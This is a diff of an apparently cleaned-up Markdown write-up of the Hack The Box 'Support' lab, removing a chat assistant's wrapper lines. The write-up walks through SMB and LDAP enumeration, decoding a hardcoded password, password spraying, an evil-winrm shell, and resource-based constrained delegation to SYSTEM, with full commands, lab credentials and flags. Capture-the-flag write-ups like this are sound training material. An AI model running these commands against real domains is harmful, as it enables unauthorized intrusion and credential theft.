@@ -1,14 +1,3 @@
-Got it ✅ — I’ll give you a **fully cleaned up `.md` file** with:
-
-* Consistent code blocks (`zsh`, `bash`, `csharp`, `py`, `json`).
-* No inline comments from me (so you don’t need to delete anything).
-* Proper fencing and formatting.
-
-Here’s the polished version:
-
----
-
-````markdown
 # 🧑‍💻 Hack The Box – Support
 
 ## 📌 Overview
@@ -26,7 +15,7 @@ Here’s the polished version:
 ### Nmap
 ```zsh
 nmap -sC -sV -oA nmap/support 10.10.11.174
-````
+```
 
 ```
 53/tcp   open  domain?
@@ -45,11 +34,10 @@ Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 **Findings:**
 
-* 389/tcp → LDAP
-* 139/tcp → SMB (guest access enabled)
+- 389/tcp → LDAP  
+- 139/tcp → SMB (guest access enabled)
 
 ### SMB Enumeration
-
 ```bash
 nxc smb support.htb -u 'a' -p '' --shares
 ```
@@ -74,7 +62,7 @@ UserInfo.exe.zip
 public LdapQuery()
 {
     string password = Protected.getPassword();
-    this.entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
+    this.entry = new DirectoryEntry("LDAP://support.htb", "support\ldap", password);
     this.entry.AuthenticationType = AuthenticationTypes.Secure;
     this.ds = new DirectorySearcher(this.entry);
 }
@@ -86,7 +74,6 @@ private static byte[] key = Encoding.ASCII.GetBytes("armando");
 ```
 
 ### Decoding
-
 ```py
 import base64
 
@@ -104,7 +91,6 @@ nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
 ```
 
 ### Credential Validation
-
 ```zsh
 nxc ldap support.htb -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
 ```
@@ -116,7 +102,6 @@ nxc ldap support.htb -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
 ---
 
 ## 🧭 BloodHound
-
 ```zsh
 rusthound-ce -d support.htb -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -o bloodhound --ldap-filter='(objectGuid=*)' -c All
 ```
@@ -124,7 +109,6 @@ rusthound-ce -d support.htb -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' 
 ---
 
 ## 🗂️ LDAP Enumeration
-
 ```json
 "ford.victoria": {
   "info": "Ironside47pleasure40Watchful"
@@ -134,7 +118,6 @@ rusthound-ce -d support.htb -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' 
 ---
 
 ## 🔑 Exploitation – Foothold
-
 ```zsh
 nxc smb support.htb -u usernames.txt -p 'Ironside47pleasure40Watchful' --continue-on-success
 ```
@@ -144,7 +127,6 @@ nxc smb support.htb -u usernames.txt -p 'Ironside47pleasure40Watchful' --continu
 ```
 
 ### Shell Access
-
 ```zsh
 evil-winrm -i support.htb -u 'support' -p 'Ironside47pleasure40Watchful'
 ```
@@ -159,14 +141,12 @@ c2ee84b4277d7cab7ea5ae7d9bc1d5bc
 ## 🚀 Privilege Escalation
 
 ### BloodHound Enumeration
-
-* `support` user → member of **SHARED SUPPORT ACCOUNTS** group
-* This group has **GenericAll** on `DC.support.htb` computer object.
+- `support` user → member of **SHARED SUPPORT ACCOUNTS** group  
+- This group has **GenericAll** on `DC.support.htb` computer object.  
 
 ![BloodHound Enumeration](ScreenShots/support-user-bloodhound.png)
 
 ### Exploit: Resource-Based Constrained Delegation (RBCD)
-
 ```zsh
 impacket-addcomputer -method SAMR -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host DC.support.htb -domain-netbios support.htb 'support.htb/support:Ironside47pleasure40Watchful'
 ```
@@ -192,36 +172,24 @@ nt authority\system
 ---
 
 ## 🏁 Flags
-
-* **User.txt:** `c2ee84b4277d7cab7ea5ae7d9bc1d5bc`
-* **Root.txt:** `ae1605fecb42f57a3d34817e12d24252`
+- **User.txt:** `c2ee84b4277d7cab7ea5ae7d9bc1d5bc`  
+- **Root.txt:** `ae1605fecb42f57a3d34817e12d24252`
 
 ---
 
 ## 🧠 Lessons Learned
-
 **Technical**
-
-* Reverse engineering revealed hardcoded service account credentials.
-* LDAP info fields may leak sensitive data (poor OPSEC).
-* RBCD remains a powerful AD privilege escalation vector.
+- Reverse engineering revealed hardcoded service account credentials.  
+- LDAP info fields may leak sensitive data (poor OPSEC).  
+- RBCD remains a powerful AD privilege escalation vector.  
 
 **Personal**
-
-* Always test leaked creds against multiple accounts.
-* Automating LDAP parsing speeds up discovery of hidden values.
+- Always test leaked creds against multiple accounts.  
+- Automating LDAP parsing speeds up discovery of hidden values.  
 
 **Reusable Techniques**
-
-* Decode obfuscation (base64 + XOR).
-* Use BloodHound to identify misconfigurations.
-* Exploit RBCD for Domain Admin when `GenericAll` on DC computer object.
-
----
-
-```
+- Decode obfuscation (base64 + XOR).  
+- Use BloodHound to identify misconfigurations.  
+- Exploit RBCD for Domain Admin when `GenericAll` on DC computer object.  
 
 ---
-
-Do you want me to save this cleaned version as a `.md` file so you can download and drop it straight into your repo?
-```
